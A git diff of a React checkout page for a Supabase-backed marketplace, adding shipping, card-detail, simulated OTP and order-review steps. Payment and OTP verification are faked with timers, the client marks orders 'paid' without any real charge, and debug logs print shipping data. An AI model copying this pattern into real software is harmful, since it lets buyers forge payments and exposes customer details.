@@ -6,14 +6,17 @@ import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Separator } from '@/components/ui/separator';
 import { supabase } from '@/integrations/supabase/client';
 import { useAuth } from '@/hooks/useAuth';
+import { useCurrency } from '@/hooks/useCurrency';
 import { toast } from '@/hooks/use-toast';
 import { Header } from '@/components/layout/Header';
-import PaymentForm from '@/components/payment/PaymentForm';
+
+import CheckoutStepper from '@/components/checkout/CheckoutStepper';
+import ShippingAddressForm, { ShippingFormData } from '@/components/checkout/ShippingAddressForm';
+import PaymentDetailsForm, { CardFormData } from '@/components/checkout/PaymentDetailsForm';
 import CardOTPVerification from '@/components/checkout/CardOTPVerification';
 import OrderReview from '@/components/checkout/OrderReview';
 import OrderConfirmationSuccess from '@/components/checkout/OrderConfirmationSuccess';
 import PaymentProcessingScreen from '@/components/checkout/PaymentProcessingScreen';
-import CheckoutStepper from '@/components/checkout/CheckoutStepper';
 
 interface Product {
   id: string;
@@ -30,161 +33,328 @@ interface SellerProfile {
   company_name: string | null;
 }
 
-type CheckoutStep =
-  | 'shipping'
-  | 'payment'
-  | 'processingPayment'
-  | 'otp'
-  | 'processingOtp'
-  | 'review'
-  | 'confirmation';
-
-type ProcessingContext = 'payment' | 'otp';
+// Define CheckoutStep type locally to avoid import issues
+type CheckoutStep = 'shipping' | 'payment' | 'processingPayment' | 'otp' | 'processingOtp' | 'review' | 'confirmation';
 
 export default function Checkout() {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
   const { user, loading: authLoading } = useAuth();
+  const { formatPriceOnly } = useCurrency();
 
   const [product, setProduct] = useState<Product | null>(null);
   const [seller, setSeller] = useState<SellerProfile | null>(null);
   const [loading, setLoading] = useState(true);
 
-  // NEW: FULL FLOW
   const [step, setStep] = useState<CheckoutStep>('shipping');
-  const [processingContext, setProcessingContext] = useState<ProcessingContext | null>(null);
-
-  const [quantity, setQuantity] = useState(1);
-  const [shippingAddress, setShippingAddress] = useState('');
-  const [notes, setNotes] = useState('');
+  const [shippingData, setShippingData] = useState<ShippingFormData | null>(null);
+  const [cardData, setCardData] = useState<CardFormData | null>(null);
   const [orderId, setOrderId] = useState<string | null>(null);
-  const [userProfile, setUserProfile] = useState<any>(null);
-  const [paymentData, setPaymentData] = useState<any>(null);
-
-  const [orderTotal, setOrderTotal] = useState<number>(0);
+  const [transactionId, setTransactionId] = useState<string | null>(null);
+  const [confirmedTotal, setConfirmedTotal] = useState<number>(0);
+  const [quantity, setQuantity] = useState(1);
 
   const productId = searchParams.get('product');
 
+  // Debug logging
+  useEffect(() => {
+    console.log('Checkout State Update:', {
+      step,
+      productId,
+      hasProduct: !!product,
+      hasShippingData: !!shippingData,
+      hasCardData: !!cardData,
+      orderId,
+      transactionId,
+    });
+  }, [step, productId, product, shippingData, cardData, orderId, transactionId]);
+
+  /* ---------------- Guards ---------------- */
   useEffect(() => {
     if (!authLoading && !user) {
       navigate('/auth?redirect=/checkout?product=' + productId);
       return;
     }
 
-    if (user) fetchUserProfile();
-    if (productId) fetchProduct();
-  }, [productId, user, authLoading]);
+    if (user && productId) {
+      fetchProduct();
+    }
+  }, [productId, user, authLoading, navigate]);
 
-  const fetchUserProfile = async () => {
-    if (!user) return;
-    const { data } = await supabase
-      .from('profiles')
-      .select('*')
-      .eq('user_id', user.id)
-      .single();
-    if (data) setUserProfile(data);
-  };
-
+  /* ---------------- Product Fetching ---------------- */
   const fetchProduct = async () => {
-    const { data: productData } = await supabase
-      .from('products')
-      .select('*')
-      .eq('id', productId)
-      .single();
-
-    if (productData) {
-      setProduct(productData);
-      setQuantity(productData.moq || 1);
-
-      const { data: sellerData } = await supabase
-        .from('profiles')
-        .select('full_name, company_name')
-        .eq('user_id', productData.seller_id)
+    try {
+      const { data: productData, error: productError } = await supabase
+        .from('products')
+        .select('*')
+        .eq('id', productId)
         .single();
 
-      if (sellerData) setSeller(sellerData);
+      if (productError) throw productError;
+
+      if (productData) {
+        setProduct(productData);
+        setQuantity(productData.moq || 1);
+
+        const { data: sellerData, error: sellerError } = await supabase
+          .from('profiles')
+          .select('full_name, company_name')
+          .eq('user_id', productData.seller_id)
+          .single();
+
+        if (sellerError) {
+          console.warn('Could not fetch seller profile:', sellerError);
+          // Don't throw here - we can still proceed without seller info
+        }
+        
+        if (sellerData) setSeller(sellerData);
+      } else {
+        toast({ 
+          title: 'Product not found', 
+          description: 'The product you are trying to purchase is no longer available.',
+          variant: 'destructive' 
+        });
+      }
+    } catch (error: any) {
+      console.error('Error fetching product:', error);
+      toast({ 
+        title: 'Error loading product', 
+        description: error.message, 
+        variant: 'destructive' 
+      });
+    } finally {
+      setLoading(false);
     }
-    setLoading(false);
   };
 
+  /* ---------------- Calculate Total ---------------- */
   const calculateTotal = () => {
     if (!product) return 0;
     const price = Number(product.price_min ?? product.price_max ?? 0);
     return price * quantity;
   };
 
-  const handleProceedToPayment = async () => {
-    if (!shippingAddress.trim()) {
-      toast({ title: 'Please enter shipping address', variant: 'destructive' });
+  /* ---------------- Shipping ---------------- */
+  const handleShippingSubmit = (data: ShippingFormData) => {
+    console.log('Shipping submitted:', data);
+    setShippingData(data);
+    setStep('payment');
+  };
+
+  /* ---------------- Payment ---------------- */
+  const handlePaymentSubmit = async (data: CardFormData & { is3DSecure?: boolean }) => {
+    console.log('Payment submitted for product:', product?.title);
+    
+    if (!user || !product) {
+      toast({ 
+        title: 'Error', 
+        description: 'Missing user or product information', 
+        variant: 'destructive' 
+      });
       return;
     }
-    if (!user || !product) return;
 
-    const total = calculateTotal();
-    setOrderTotal(total);
+    setCardData(data);
+    setStep('processingPayment');
 
     try {
-      const { data: order, error } = await supabase
-        .from('orders')
+      const lastFour = data.cardNumber.replace(/\s/g, '').slice(-4);
+      const brand = detectCardBrand(data.cardNumber);
+      const total = calculateTotal();
+
+      console.log('Creating payment transaction for amount:', total);
+      const { data: tx, error } = await supabase
+        .from('payment_transactions')
         .insert({
-          buyer_id: user.id,
-          seller_id: product.seller_id,
-          product_id: product.id,
-          quantity,
-          total_price: total,
-          status: 'pending_payment',
-          tracking_info: {
-            shipping_address: shippingAddress,
-            notes,
-          },
+          user_id: user.id,
+          amount: total,
+          currency: 'USD',
+          card_last_four: lastFour,
+          card_brand: brand,
+          status: 'pending_otp',
         })
         .select()
         .single();
 
       if (error) throw error;
 
-      setOrderId(order.id);
+      console.log('Payment transaction created:', tx.id);
+      setTransactionId(tx.id);
+      
+      // Simulate processing completion after 2 seconds
+      setTimeout(() => {
+        toast({ 
+          title: 'OTP Sent', 
+          description: 'Enter the code sent to your phone.' 
+        });
+        setStep('otp');
+      }, 2000);
+      
+    } catch (e: any) {
+      console.error('Payment error:', e);
+      toast({ 
+        title: 'Payment error', 
+        description: e.message, 
+        variant: 'destructive' 
+      });
       setStep('payment');
-    } catch (error: any) {
-      toast({ title: 'Error', description: error.message, variant: 'destructive' });
     }
   };
 
-  const handlePaymentSuccess = async (transactionId: string) => {
-    if (!orderId) return;
+  /* ---------------- OTP ---------------- */
+  const handleOTPVerified = async () => {
+    console.log('OTP verified, transactionId:', transactionId);
+    if (!transactionId) return;
 
-    await supabase.from('orders').update({
-      status: 'paid',
-      transaction_id: transactionId,
-    }).eq('id', orderId);
-
-    setProcessingContext('payment');
-    setStep('processingPayment');
-  };
-
-  const handlePaymentProcessed = () => {
-    setStep('otp');
-  };
-
-  const handleOtpVerified = () => {
-    setProcessingContext('otp');
     setStep('processingOtp');
+
+    try {
+      await supabase
+        .from('payment_transactions')
+        .update({ 
+          status: 'otp_verified', 
+          otp_verified: true 
+        })
+        .eq('id', transactionId);
+      
+      // Simulate OTP processing completion
+      setTimeout(() => {
+        setStep('review');
+      }, 1500);
+      
+    } catch (error: any) {
+      console.error('OTP verification error:', error);
+      toast({
+        title: 'OTP Verification Error',
+        description: error.message,
+        variant: 'destructive'
+      });
+    }
   };
 
-  const handleOtpProcessed = () => {
-    setStep('review');
-  };
-
+  /* ---------------- Review ---------------- */
   const handleConfirmOrder = async () => {
-    if (!orderId) return;
+    console.log('=======================');
+    console.log('handleConfirmOrder START (Single Product)');
+    console.log('Product:', product?.title);
+    console.log('Quantity:', quantity);
+    console.log('User:', user?.id);
+    console.log('=======================');
 
-    await supabase.from('orders').update({
-      status: 'confirmed',
-    }).eq('id', orderId);
+    if (!user || !product || !shippingData || !cardData) {
+      console.log('Missing required data:', { user, product, shippingData, cardData });
+      toast({ 
+        title: 'Error', 
+        description: 'Missing required information', 
+        variant: 'destructive' 
+      });
+      return;
+    }
 
-    setStep('confirmation');
+    try {
+      const total = calculateTotal();
+      
+      // Save total BEFORE creating order
+      console.log('Setting confirmedTotal to:', total);
+      setConfirmedTotal(total);
+      
+      console.log('Creating order for product:', {
+        title: product.title,
+        price: product.price_min ?? product.price_max,
+        quantity: quantity,
+        total: total,
+        seller_id: product.seller_id
+      });
+
+      // Create order in database
+      const { data: order, error } = await supabase
+        .from('orders')
+        .insert({
+          buyer_id: user.id,
+          seller_id: product.seller_id,
+          product_id: product.id,
+          quantity: quantity,
+          total_price: total,
+          status: 'paid',
+          shipping_address: JSON.stringify(shippingData),
+          tracking_info: {
+            shipping_address: shippingData.streetAddress,
+            notes: shippingData.additionalNotes || '',
+            city: shippingData.city,
+            state: shippingData.stateProvince,
+            country: shippingData.country,
+            postalCode: shippingData.postalCode,
+          },
+        })
+        .select()
+        .single();
+
+      if (error) {
+        console.error('Order creation error:', error);
+        throw error;
+      }
+      
+      console.log('Order created with ID:', order.id);
+      setOrderId(order.id);
+
+      // Update payment transaction with order reference
+      if (transactionId) {
+        await supabase
+          .from('payment_transactions')
+          .update({ 
+            order_id: order.id,
+            status: 'completed' 
+          })
+          .eq('id', transactionId);
+      }
+
+      console.log('=======================');
+      console.log('handleConfirmOrder COMPLETE');
+      console.log('Order ID created:', order.id);
+      console.log('Confirmed total:', total);
+      console.log('Step changing to confirmation');
+      console.log('=======================');
+
+      setStep('confirmation');
+    } catch (e: any) {
+      console.error('Order error:', e);
+      toast({ 
+        title: 'Order error', 
+        description: e.message, 
+        variant: 'destructive' 
+      });
+    }
   };
 
+  const detectCardBrand = (num: string): string => {
+    const c = num.replace(/\s/g, '');
+    if (/^4/.test(c)) return 'Visa';
+    if (/^5[1-5]/.test(c)) return 'Mastercard';
+    if (/^3[47]/.test(c)) return 'American Express';
+    if (/^6(?:011|5)/.test(c)) return 'Discover';
+    return 'Card';
+  };
+
+  const handleBack = () => {
+    switch (step) {
+      case 'payment':
+        setStep('shipping');
+        break;
+      case 'otp':
+        setStep('payment');
+        break;
+      case 'review':
+        setStep('otp');
+        break;
+      case 'confirmation':
+        navigate(`/products/${productId}`);
+        break;
+      default:
+        navigate(-1);
+    }
+  };
+
+  /* ---------------- Loading & Error States ---------------- */
   if (loading || authLoading) {
     return (
       <div className="min-h-screen bg-background">
@@ -213,34 +383,41 @@ export default function Checkout() {
     );
   }
 
-  const orderItems = [
-    {
-      id: product.id,
-      title: product.title,
-      price: Number(product.price_min ?? product.price_max ?? 0),
-      quantity,
-      image: product.images?.[0] || '/placeholder.svg',
-      seller_name: seller?.company_name || seller?.full_name || 'Seller',
-    }
-  ];
+  /* ---------------- Prepare Data for Components ---------------- */
+  const orderItems = [{
+    id: product.id,
+    title: product.title,
+    price: Number(product.price_min ?? product.price_max ?? 0),
+    quantity,
+    image: product.images?.[0] || '/placeholder.svg',
+    seller_name: seller?.company_name || seller?.full_name || 'Seller',
+    seller_id: product.seller_id,
+    product_id: product.id,
+  }];
 
-  const shippingData = {
-    fullName: userProfile?.full_name || user?.user_metadata?.full_name || 'Customer',
-    streetAddress: shippingAddress,
-    city: 'N/A',
-    stateProvince: 'N/A',
-    postalCode: 'N/A',
-    country: 'N/A',
-    phoneNumber: userProfile?.phone || 'N/A',
-    email: user?.email || 'N/A',
+  const cardDisplayData = cardData ? {
+    cardholderName: cardData.cardholderName,
+    cardNumber: `•••• •••• •••• ${cardData.cardNumber.replace(/\s/g, '').slice(-4)}`,
+    expiryMonth: cardData.expiryMonth,
+    expiryYear: cardData.expiryYear,
+  } : {
+    cardholderName: 'N/A',
+    cardNumber: '•••• •••• •••• ••••',
+    expiryMonth: 'MM',
+    expiryYear: 'YY',
   };
 
-  const cardData = paymentData || {
-    cardholderName: 'N/A',
-    cardNumber: '0000 0000 0000 0000',
-    expiryMonth: '01',
-    expiryYear: '30',
-    cvv: '000',
+  // Ensure shippingData has all required properties for OrderReview
+  const safeShippingData = shippingData || {
+    fullName: '',
+    streetAddress: '',
+    city: '',
+    stateProvince: '',
+    postalCode: '',
+    country: '',
+    phoneNumber: '',
+    email: user?.email || '',
+    additionalNotes: '',
   };
 
   return (
@@ -251,13 +428,7 @@ export default function Checkout() {
 
         <Button
           variant="ghost"
-          onClick={() => {
-            if (step === 'payment') return setStep('shipping');
-            if (step === 'otp') return setStep('payment');
-            if (step === 'review') return setStep('otp');
-            if (step === 'confirmation') return navigate('/orders');
-            navigate(-1);
-          }}
+          onClick={handleBack}
           className="mb-6"
         >
           <ArrowLeft className="h-4 w-4 mr-2" />
@@ -266,113 +437,113 @@ export default function Checkout() {
 
         <div className="grid lg:grid-cols-3 gap-8">
           <div className="lg:col-span-2">
-
             {step === 'shipping' && (
-              <div className="space-y-6">
-                <Card>
-                  <CardHeader>
-                    <CardTitle className="flex items-center gap-2">
-                      <Package className="h-5 w-5" />
-                      Order Details
-                    </CardTitle>
-                  </CardHeader>
-                  <CardContent className="space-y-6">
-                    {/* your order details UI */}
-                  </CardContent>
-                </Card>
-
-                <Button className="w-full" size="lg" onClick={handleProceedToPayment}>
-                  Proceed to Payment
-                </Button>
-              </div>
+              <ShippingAddressForm 
+                onSubmit={handleShippingSubmit}
+                defaultValues={shippingData || undefined}
+              />
             )}
 
             {step === 'payment' && (
-              <PaymentForm
-                amount={orderTotal}
+              <PaymentDetailsForm
+                amount={calculateTotal()}
                 currency="USD"
-                orderId={orderId || undefined}
+                onSubmit={handlePaymentSubmit}
                 productName={product.title}
                 quantity={quantity}
-                onSuccess={handlePaymentSuccess}
-                onCancel={() => setStep('shipping')}
-                onPaymentDataCaptured={(data) => setPaymentData(data)}
-                shippingAddress={shippingAddress}
-                buyerName={userProfile?.full_name || user?.user_metadata?.full_name || 'Customer'}
-                buyerEmail={user?.email}
-                buyerPhone={userProfile?.phone}
               />
             )}
 
-            {(step === 'processingPayment' || step === 'processingOtp') && (
+            {step === 'processingPayment' && (
               <PaymentProcessingScreen
-                mode={processingContext === 'payment' ? 'processingPayment' : 'processingOtp'}
-                onDone={
-                  processingContext === 'payment'
-                    ? handlePaymentProcessed
-                    : handleOtpProcessed
-                }
+                title="Processing payment…"
+                description="Confirming your card details."
+                onDone={() => {
+                  // This is handled in the timeout in handlePaymentSubmit
+                }}
               />
             )}
 
-            {step === 'otp' && (
+            {step === 'otp' && cardData && (
               <CardOTPVerification
-                cardLastFour="1234"
-                onVerified={handleOtpVerified}
-                onResend={() => toast({ title: 'OTP resent!' })}
+                cardLastFour={cardData.cardNumber.replace(/\s/g, '').slice(-4)}
+                onVerified={handleOTPVerified}
+                onResend={() => toast({ title: 'OTP resent' })}
+              />
+            )}
+
+            {step === 'processingOtp' && (
+              <PaymentProcessingScreen
+                title="Verifying OTP…"
+                description="Please wait while we verify your card."
+                onDone={() => {
+                  // This is handled in the timeout in handleOTPVerified
+                }}
               />
             )}
 
             {step === 'review' && (
               <OrderReview
                 items={orderItems}
-                shippingData={shippingData}
-                cardData={cardData}
-                totalAmount={orderTotal}
+                shippingData={safeShippingData}
+                cardData={cardDisplayData}
+                totalAmount={calculateTotal()}
+                currency="USD"
                 onConfirm={handleConfirmOrder}
                 onEditShipping={() => setStep('shipping')}
                 onEditPayment={() => setStep('payment')}
-                isSubmitting={false}
               />
             )}
 
             {step === 'confirmation' && (
               <OrderConfirmationSuccess
-                orderIds={[orderId || '']}
-                totalAmount={orderTotal}
+                orderIds={orderId ? [orderId] : []}
+                totalAmount={confirmedTotal}
                 currency="USD"
               />
             )}
-
           </div>
 
-          <div className="lg:col-span-1">
-            <Card className="sticky top-4">
-              <CardHeader>
-                <CardTitle>Order Summary</CardTitle>
-              </CardHeader>
-              <CardContent className="space-y-4">
-                <div className="flex justify-between">
-                  <span className="text-muted-foreground">Product</span>
-                  <span>{product.title}</span>
-                </div>
-                <div className="flex justify-between">
-                  <span className="text-muted-foreground">Unit Price</span>
-                  <span>${(product.price_min || product.price_max || 0).toFixed(2)}</span>
-                </div>
-                <div className="flex justify-between">
-                  <span className="text-muted-foreground">Quantity</span>
-                  <span>{quantity}</span>
-                </div>
-                <Separator />
-                <div className="flex justify-between text-lg font-bold">
-                  <span>Total</span>
-                  <span>${orderTotal.toFixed(2)}</span>
-                </div>
-              </CardContent>
-            </Card>
-          </div>
-
+          {step !== 'confirmation' && product && (
+            <div className="lg:col-span-1">
+              <Card className="sticky top-4">
+                <CardHeader>
+                  <CardTitle className="flex items-center gap-2">
+                    <Package className="h-5 w-5" />
+                    Order Summary
+                  </CardTitle>
+                </CardHeader>
+                <CardContent className="space-y-4">
+                  <div className="space-y-2">
+                    <div className="flex justify-between">
+                      <span className="text-muted-foreground">Product</span>
+                      <span className="font-medium truncate max-w-[150px]">{product.title}</span>
+                    </div>
+                    <div className="flex justify-between">
+                      <span className="text-muted-foreground">Unit Price</span>
+                      <span>{formatPriceOnly(product.price_min || product.price_max || 0)}</span>
+                    </div>
+                    <div className="flex justify-between">
+                      <span className="text-muted-foreground">Quantity</span>
+                      <span>{quantity}</span>
+                    </div>
+                  </div>
+                  
+                  <Separator />
+                  
+                  <div className="flex justify-between text-lg font-bold">
+                    <span>Total</span>
+                    <span>{formatPriceOnly(calculateTotal())}</span>
+                  </div>
+                  
+                  <div className="mt-4 text-xs text-muted-foreground">
+                    <p className="font-medium">Seller: {seller?.company_name || seller?.full_name || 'Unknown'}</p>
+                    <p className="mt-1">MOQ: {product.moq || 1} units</p>
+                  </div>
+                </CardContent>
+              </Card>
+            </div>
+          )}
         </div>
       </div>
     </div>
